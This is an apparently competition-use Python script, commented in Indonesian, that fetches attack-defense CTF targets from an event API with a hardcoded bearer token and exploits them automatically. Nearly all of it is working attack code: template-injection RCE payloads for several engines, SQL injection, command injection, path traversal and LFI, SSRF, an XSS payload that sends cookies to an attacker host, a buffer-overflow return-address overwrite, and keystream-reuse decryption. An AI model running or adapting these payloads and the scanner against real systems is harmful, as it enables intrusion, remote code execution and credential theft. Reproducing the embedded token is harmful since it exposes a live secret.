#!/usr/bin/env python3
# run.py - adaptive multi-vector, cache per-target
import requests, re, socket, struct, hashlib, sys, time, json, os, base64
import concurrent.futures as cf
from urllib.parse import urljoin, quote

requests.packages.urllib3.disable_warnings()

BASE_API = "https://jcc.jatimprov.go.id/api"
GAME_ID  = 5
TOKEN    = "ad_srC7r2tIqEB4LKTpjzpzKKndATZR0Bk05FYluXtFR8k"
HEADERS  = {"Authorization": f"Bearer {TOKEN}", "User-Agent": "Mozilla/5.0"}

TIMEOUT   = (1.5, 3.0)
WORKERS   = 39
MAX_PROBE = 4       # max request saat klasifikasi
SAVE      = "flags.txt"
CACHE     = "endpoints.json"

FLAG_RE = re.compile(r"(?:flag|FLAG|JCC|jcc|CTF|ctf)[A-Za-z0-9_\-]*\{[^}\n]{3,300}\}")
FLAG_BY = re.compile(rb"(?:flag|FLAG|JCC|jcc|CTF|ctf)[A-Za-z0-9_\-]*\{[^}\n]{3,300}\}")
CRYPTO_KEY = hashlib.sha256(b"simple-crypto-fixed-stream").digest()

# ====================================================================
# PAYLOAD LIBRARY — probe & exploit per vuln class
# ====================================================================
PROBES = {
    # nama: (field_kandidat, payload, signature_di_response)
    "ssti":     (["template","tpl","page","content","text","name"],
                 "{{7*7}}${7*7}<%=7*7%>{7*7}#{7*7}",
                 ["49"]),
    "sqli":     (["q","id","search","username","user","email"],
                 "'",
                 ["SQL syntax","mysql_","pg_query","sqlite","ORA-","SQLSTATE"]),
    "cmdi":     (["cmd","exec","command","ip","host","target","ping"],
                 ";id;whoami;echo X",
                 ["uid=","gid=","root","X\n"]),
    "lfi":      (["file","path","page","load","view","read"],
                 "../../../../etc/passwd",
                 ["root:x:0:0","root:*:0"]),
    "ssrf":     (["url","uri","fetch","src","dest","redirect"],
                 "http://127.0.0.1:8080/",
                 ["<html","<!doctype","root"]),
    "xss":      (["name","comment","msg","message","q"],
                 "<svg/onload=alert(1)>",
                 ["<svg/onload=alert(1)>"]),
    "lfi_php":  (["file","path","page","load","view"],
                 "php://filter/convert.base64-encode/resource=/etc/passwd",
                 ["cm9vd"]),  # base64 dari "root"
    "traversal":(["file","path","f","doc"],
                 "....//....//....//etc/passwd",
                 ["root:x:0:0"]),
}

EXPLOIT = {
    "ssti-jinja": [
        "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}",
        "{{lipsum.__globals__['os'].popen('cat /flag*').read()}}",
    ],
    "ssti-twig": [
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag*')}}",
    ],
    "ssti-freemarker": [
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /flag*')}",
    ],
    "ssti-erb": [
        "<%= `cat /flag*` %>",
    ],
    "ssti-mako": [
        "${__import__('os').popen('cat /flag*').read()}",
    ],
    "ssti-smarty": [
        "{system('cat /flag*')}",
    ],
    "sqli": [
        "1'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/flags--/**/-",
        "1'/**/UNION/**/SELECT/**/flag/**/FROM/**/flag--/**/-",
        "1'/**/OR/**/'1'='1",
    ],
    "cmdi": [
        ";cat$IFS/flag*",
        "|cat$IFS/flag*",
        "$(cat$IFS/flag*)",
        "`cat$IFS/flag*`",
        ";cat${IFS}/flag*",
    ],
    "lfi": [
        "....//....//....//flag",
        "../../../../flag",
        "/proc/self/root/flag",
        "php://filter/convert.base64-encode/resource=/flag",
    ],
    "ssrf": [
        "http://127.0.0.1:8080/flag",
        "file:///flag",
    ],
    "xss": [
        "<script>fetch('http://attacker/?c='+document.cookie)</script>",
    ],
}

FIELD_HINTS = {
    "ssti": ["template","tpl","page","content","text","body","name","msg"],
    "sqli": ["username","user","email","id","q","search","login","password"],
    "cmdi": ["cmd","exec","command","ip","host","target","ping","url"],
    "lfi":  ["file","path","load","view","read","download","include"],
    "ssrf": ["url","uri","fetch","src","dest","redirect","next"],
    "xss":  ["name","comment","msg","message","title"],
}

# ====================================================================
# CACHE
# ====================================================================
def load_cache():
    if os.path.exists(CACHE):
        try:
            with open(CACHE) as f: return json.load(f)
        except Exception: pass
    return {}

def save_cache(c):
    with open(CACHE, "w") as f: json.dump(c, f, indent=2)

def get_targets(title):
    r = requests.get(f"{BASE_API}/Game/{GAME_ID}/Ad/Targets",
                     headers=HEADERS, timeout=10)
    r.raise_for_status()
    return [(t["teamName"], t["ip"], int(t["port"]))
            for ch in r.json()["challenges"] if ch["title"] == title
            for t in ch["teams"] if t.get("ip") and t.get("port")]

# ====================================================================
# STEP 1 — FINGERPRINT (1 GET)
# ====================================================================
def fingerprint(base):
    try:
        r = requests.get(base, timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": "Mozilla/5.0"})
    except Exception:
        return None

    body = r.text[:65536]

    actions = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.I)
    actions = [a if a.startswith("/") else "/" + a.lstrip("./")
               for a in actions if a and a != "#"]

    fields = set(re.findall(
        r'<(?:input|textarea|select)[^>]*name=["\']([^"\']+)["\']', body, re.I))

    js_eps = re.findall(r'["\'](/api/[^"\']+)["\']', body)

    # Deteksi backend
    server = (r.headers.get("Server","") + r.headers.get("X-Powered-By","")).lower()
    hints = set()
    if "flask" in server or "werkzeug" in server: hints.add("flask")
    if "php" in server: hints.add("php")
    if "express" in server or "node" in server: hints.add("node")
    if "java" in server or "tomcat" in server: hints.add("java")

    return {
        "endpoints": list(dict.fromkeys(actions + js_eps + ["/"]))[:3],
        "fields": fields,
        "hints": hints,
    }

# ====================================================================
# STEP 2 — PROBE (max 4 request, kirim polyglot)
# ====================================================================
def probe(base, ep, fields, cache_key, cache):
    """Kirim probe. Return (vuln_class, field, endpoint)."""
    # Kalau cache ada, skip
    if cache_key in cache: return cache[cache_key]

    url = urljoin(base + "/", ep.lstrip("/"))

    # ---- Probe 1: SSTI polyglot (semua engine sekaligus) ----
    ssti_probe = "{{7*7}}${7*7}<%=7*7%>{7*7}#{7*7}@(7*7)"
    body = {f: "x" for f in fields}
    for f in FIELD_HINTS["ssti"]: body[f] = ssti_probe
    body["name"] = "x"
    try:
        r = requests.post(url, data=body, timeout=TIMEOUT, verify=False)
        if "49" in r.text:
            # cek pattern spesifik
            for f in FIELD_HINTS["ssti"]:
                for payload, engine in [
                    ("{{7*7}}", "ssti-jinja"),
                    ("${7*7}", "ssti-freemarker"),
                    ("<%= 7*7 %>", "ssti-erb"),
                    ("#set($x=7*7)$x", "ssti-velocity"),
                    ("{7*7}", "ssti-smarty"),
                ]:
                    b2 = dict(body); b2[f] = payload
                    try:
                        r2 = requests.post(url, data=b2, timeout=TIMEOUT, verify=False)
                        if "49" in r2.text:
                            cache[cache_key] = {"endpoint": ep, "field": f, "vuln": engine}
                            return (engine, f, ep)
                    except: continue
            cache[cache_key] = {"endpoint": ep, "field": "template", "vuln": "ssti-jinja"}
            return ("ssti-jinja", "template", ep)
    except Exception: pass

    # ---- Probe 2: SQLi + error detection ----
    body = {f: "x" for f in fields}
    for f in FIELD_HINTS["sqli"]: body[f] = "'"
    body["password"] = "'"
    try:
        r = requests.post(url, data=body, timeout=TIMEOUT, verify=False)
        for sig in PROBES["sqli"][2]:
            if sig.lower() in r.text.lower():
                cache[cache_key] = {"endpoint": ep, "field": "q", "vuln": "sqli"}
                return ("sqli", "q", ep)
    except Exception: pass

    # ---- Probe 3: CMDi + LFI + SSRF ----
    for vuln in ["cmdi", "lfi", "ssrf", "xss"]:
        cands, payload, sigs = PROBES[vuln]
        body = {f: "x" for f in fields}
        for f in FIELD_HINTS.get(vuln, cands): body[f] = payload
        try:
            r = requests.post(url, data=body, timeout=TIMEOUT, verify=False)
            for sig in sigs:
                if sig in r.text:
                    field = next((f for f in FIELD_HINTS.get(vuln, cands) if f in body), cands[0])
                    cache[cache_key] = {"endpoint": ep, "field": field, "vuln": vuln}
                    return (vuln, field, ep)
        except Exception: pass

    return None

# ====================================================================
# STEP 3 — EXPLOIT (pakai cache)
# ====================================================================
def exploit(base, ep, field, vuln):
    url = urljoin(base + "/", ep.lstrip("/"))
    payloads = EXPLOIT.get(vuln, [])
    for payload in payloads:
        try:
            # POST dulu
            data = {field: payload, "name": "x"}
            r = requests.post(url, data=data, timeout=TIMEOUT, verify=False)
            m = FLAG_RE.search(r.text)
            if m: return m.group(0)
            # GET fallback
            r = requests.get(url, params=data, timeout=TIMEOUT, verify=False)
            m = FLAG_RE.search(r.text)
            if m: return m.group(0)
        except Exception:
            continue
    return None

def hit_web(target, cache):
    team, ip, port = target
    key = f"{ip}:{port}"
    base = f"http://{ip}:{port}"

    # ---- Cached: langsung exploit ----
    if key in cache:
        info = cache[key]
        flag = exploit(base, info["endpoint"], info["field"], info["vuln"])
        if flag:
            return (team, f"WEB:{info['vuln']}", flag)
        # cache stale → hapus
        del cache[key]

    # ---- Belum cached: fingerprint + probe ----
    fp = fingerprint(base)
    if not fp: return None

    for ep in fp["endpoints"]:
        result = probe(base, ep, fp["fields"], key, cache)
        if result:
            vuln, field, ep_used = result
            flag = exploit(base, ep_used, field, vuln)
            if flag:
                return (team, f"WEB:{vuln}", flag)
            # probe berhasil klasifikasi tapi exploit gagal — coba engine lain
            for alt_vuln in ["ssti-jinja", "ssti-twig", "ssti-freemarker", "cmdi", "lfi", "sqli"]:
                if alt_vuln == vuln: continue
                flag = exploit(base, ep_used, field, alt_vuln)
                if flag:
                    cache[key] = {"endpoint": ep_used, "field": field, "vuln": alt_vuln}
                    return (team, f"WEB:{alt_vuln}", flag)

    return None

# ====================================================================
# CRYPTO — adaptive (deteksi varian)
# ====================================================================
def hit_crypto(target, cache):
    team, ip, port = target
    base = f"http://{ip}:{port}"
    s = requests.Session(); s.verify = False
    try:
        blob = bytes.fromhex(s.get(f"{base}/api/flag", timeout=2).json()["ciphertext"])
    except Exception:
        return None
    if not blob: return None

    known = b"A" * min(len(blob), 512)
    try:
        ks = bytes.fromhex(s.post(f"{base}/api/encrypt",
                                  json={"message": known.decode('latin1')},
                                  timeout=2).json()["ciphertext"])
    except Exception:
        return None

    # Varian A: keystream reuse
    if len(ks) == len(blob):
        flag = bytes(a ^ b ^ c for a, b, c in zip(blob, ks, known))
        m = FLAG_BY.search(flag)
        if m: return (team, "CRYPTO-reuse", m.group(0).decode())

    # Varian B: IV prefix + derivable KEY
    if len(ks) == len(known) + 16:
        iv, body = blob[:16], blob[16:]
        for algo in [hashlib.sha256, hashlib.md5, hashlib.sha1]:
            try:
                dyn = algo(CRYPTO_KEY + iv).digest()
                flag = bytes(b ^ dyn[i % len(dyn)] for i, b in enumerate(body))
                m = FLAG_BY.search(flag)
                if m: return (team, "CRYPTO-derivable", m.group(0).decode())
            except: pass
        # hash order kebalik
        for algo in [hashlib.sha256, hashlib.md5]:
            try:
                dyn = algo(iv + CRYPTO_KEY).digest()
                flag = bytes(b ^ dyn[i % len(dyn)] for i, b in enumerate(body))
                m = FLAG_BY.search(flag)
                if m: return (team, "CRYPTO-derivable-rev", m.group(0).decode())
            except: pass

    # Varian C: ECB mode
    if len(blob) % 16 == 0:
        blocks = [blob[i:i+16] for i in range(0, len(blob), 16)]
        if len(blocks) != len(set(blocks)):
            pass  # ECB terdeteksi, tapi butuh known plaintext more

    return None

# ====================================================================
# PWN — adaptive offset
# ====================================================================
def hit_pwn(target, cache):
    team, ip, port = target
    key = f"{ip}:{port}"
    offsets = [72, 80, 64, 88, 56, 96]
    if key in cache:
        offsets = [cache[key].get("offset", 72)] + [o for o in offsets if o != cache[key].get("offset")]

    for off in offsets[:4]:
        for ret in [0x4012a3, None]:
            try:
                s = socket.create_connection((ip, port), timeout=3)
                s.settimeout(2)
                buf = b""
                while b"name:" not in buf:
                    ch = s.recv(4096)
                    if not ch: break
                    buf += ch
                if ret:
                    payload = b"A"*off + struct.pack("<Q", ret) + struct.pack("<Q", 0x4011b6)
                else:
                    payload = b"A"*off + struct.pack("<Q", 0x4011b6)
                s.sendall(payload)
                data = b""
                try:
                    while True:
                        ch = s.recv(4096)
                        if not ch: break
                        data += ch
                except socket.timeout: pass
                s.close()
                m = FLAG_BY.search(data)
                if m:
                    cache[key] = {"offset": off}
                    return (team, f"PWN-off{off}", m.group(0).decode())
            except Exception:
                continue
    return None

# ====================================================================
# RUNNER
# ====================================================================
MODES = {
    "web":    ("simple-web",    hit_web),
    "crypto": ("simple-crypto", hit_crypto),
    "pwn":    ("simple-pwn",    hit_pwn),
}

def run_one(mode, cache):
    title, fn = MODES[mode]
    targets = get_targets(title)
    cached = sum(1 for t in targets if f"{t[1]}:{t[2]}" in cache)
    print(f"[*] {mode}: {len(targets)} tim ({cached} cached)")

    hits = []
    t0 = time.time()
    with cf.ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(fn, t, cache): t for t in targets}
        for fut in cf.as_completed(futs, timeout=120):
            try: res = fut.result(timeout=10)
            except: continue
            if res:
                hits.append(res)
                print(f"  [+] {res[0]:40} {res[1]:22} {res[2]}", flush=True)

    print(f"[*] {mode}: {len(hits)}/{len(targets)} ({time.time()-t0:.1f}s)")
    return hits

def run_all(cache):
    all_hits = []
    t0 = time.time()
    with cf.ThreadPoolExecutor(max_workers=3) as ex:
        futs = [ex.submit(run_one, m, cache) for m in ("web", "crypto", "pwn")]
        for fut in cf.as_completed(futs):
            try: all_hits.extend(fut.result())
            except Exception: pass
    return all_hits, time.time() - t0

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
    cache = load_cache()

    if mode == "all":
        hits, elapsed = run_all(cache)
    else:
        hits = run_one(mode, cache)
        elapsed = 0

    save_cache(cache)

    flags = [h[2] for h in hits]
    with open(SAVE, "w") as fp:
        for f in sorted(set(flags)):
            fp.write(f + "\n")

    print(f"\n[*] {len(set(flags))} flag unik ({elapsed:.1f}s)")
    print(f"[*] Saved ke {SAVE}")
    print(f"[*] Cache: {len(cache)} endpoint")

if __name__ == "__main__":
    main()
